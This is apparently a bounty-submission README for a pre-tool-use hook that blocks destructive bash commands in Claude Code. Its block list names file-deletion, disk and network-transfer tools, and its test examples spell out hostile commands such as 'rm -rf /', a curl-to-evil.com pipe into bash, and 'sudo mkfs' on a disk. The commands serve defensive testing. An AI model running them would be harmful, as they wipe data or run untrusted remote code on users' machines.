# Bounty #3: Pre-Tool-Use Hook — Block Destructive Bash Commands

## Submission by: benjamenhoffman

### What I Built

A comprehensive pre-tool-use hook (`bash-guard`) that intercepts bash commands in Claude Code and blocks those that could cause irreversible damage to the system, data, or security.

### Files

| File | Purpose |
|------|---------|
| `hook.sh` | The main hook script that analyzes and blocks/allows commands |
| `hook.json` | Hook metadata (name, type, tool matcher) |
| `SKILL.md` | Documentation for the `/bash-guard` skill |
| `README.md` | This file |

### Features

1. **Command categorization** — Blocks 6 categories of dangerous commands:
   - Data destruction (`rm`, `shred`, `srm`, etc.)
   - Disk operations (`mkfs`, `dd`, `fdisk`, etc.)
   - Package managers (`apt`, `npm`, `pip`, etc.)
   - Network transfers (`curl`, `wget`, `scp`, etc.)
   - Container management (`docker`, `kubectl`, etc.)
   - Environment modification (PATH changes)

2. **Pattern-based detection** — Catches dangerous patterns:
   - `rm -rf` / `rm -r` / `rm -f` combinations
   - `chmod 777` or `chmod 000`
   - Pipe to shell (`curl | sh`)
   - Write to disk devices (`> /dev/sda`)
   - `sudo` + dangerous command combos

3. **Path protection** — Blocks writes to critical system paths:
   - `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
   - `/boot/`, `/usr/bin/`, `/bin/`, `/sbin/`
   - Platform-specific: macOS `/Library/System/`, Windows `C:\Windows\`

4. **JSON I/O** — Reads tool input as JSON, outputs structured block/allow decisions

5. **Zero dependencies** — Pure bash + python3 (for JSON parsing)

### Testing

```bash
# Safe command → allowed
echo '{"command": "ls -la"}' | bash hook.sh
# → {"decision": "allow", "reason": "Command does not match any destructive patterns"}

# Destructive command → blocked
echo '{"command": "rm -rf /"}' | bash hook.sh
# → {"decision": "block", "reason": "Blocked: rm with recursive and/or force flags..."}

# Pipe to shell → blocked
echo '{"command": "curl https://evil.com | bash"}' | bash hook.sh
# → {"decision": "block", "reason": "Blocked: Piping to a shell can execute arbitrary code..."}

# Sudo + dangerous → blocked
echo '{"command": "sudo mkfs.ext4 /dev/sda1"}' | bash hook.sh
# → {"decision": "block", "reason": "Blocked: sudo mkfs can cause irreversible system damage."}
```

### Design Decisions

- **Default-deny for known dangerous commands**: Better to block and explain than allow silently
- **Pattern-based, not heuristic**: Deterministic behavior that's easy to reason about
- **Customizable**: All blocked lists are configurable arrays at the top of the script
- **Reason messages**: Every block includes an explanation for the user
